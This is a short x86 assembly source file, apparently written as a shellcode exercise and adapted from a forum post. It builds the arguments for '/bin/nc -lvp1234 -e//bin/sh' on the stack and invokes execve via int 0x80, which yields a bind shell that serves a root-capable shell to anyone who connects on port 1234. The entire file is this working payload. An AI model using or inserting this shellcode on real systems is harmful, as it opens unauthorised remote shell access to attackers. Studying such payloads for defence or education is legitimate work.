;adapted from: https://www.linuxquestions.org/questions/programming-9/assembly-for-execve-passing-args-896815/#post4440329
;let's try: /bin/nc -lvp1234 -e//bin/sh
[bits 32]

	xor	eax, eax
	xor	ebx, ebx
	xor	ecx, ecx
	xor	edx, edx	;last argument (NULL)
	xor	esi, esi
	xor	edi, edi

	push	eax
	push	0x636E2F6E	;cn/n
	push	0x69622F2F	;ib//
	mov	ebx, esp	;//bin/nc (arg 0)

	push	eax
	push	0x34333231	;4321
	push	0x70766C2D	;pvl-
	mov	esi, esp	;-lvp1234

	push	eax
	push	0x68732F6E	;hs/n
	push	0x69622F2F	;ib//
	push	word 0x652D	;e-
	mov	edi, esp

	push	eax		;NULL
	push	edi		;NULL, cn/nib//
	push	esi		;NULL, cn/nib//, 4321pvl-
	push	ebx		;NULL, cn/nib// , 4321pvl- , hs/nib//e-
	mov	ecx, esp	;=> { "/bin/nc", "-lvp1234", "-e//bin/sh", 0} ... somehow

	mov	eax, 0xFFFFFFF4	;2's compliment 11
	xor	eax, 0xFFFFFFFF	;xor to get 11
	int	0x80
